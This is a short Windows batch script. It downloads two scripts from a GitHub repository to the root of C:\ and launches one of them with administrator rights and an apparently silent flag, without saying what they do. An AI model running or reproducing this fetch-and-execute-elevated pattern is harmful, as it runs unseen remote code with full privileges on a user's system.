@echo off
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/SOL/refs/heads/main/SOL_SETUP.ps1' -OutFile 'C:\SOL_SETUP.ps1'"
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/SOL/refs/heads/main/RUNSYS_SOL.bat' -OutFile 'C:\RUNSYS_SOL.bat'"
powershell -NoProfile -Command "Start-Process -FilePath 'C:\RUNSYS_SOL.bat' -ArgumentList '/S' -Verb RunAs"
exit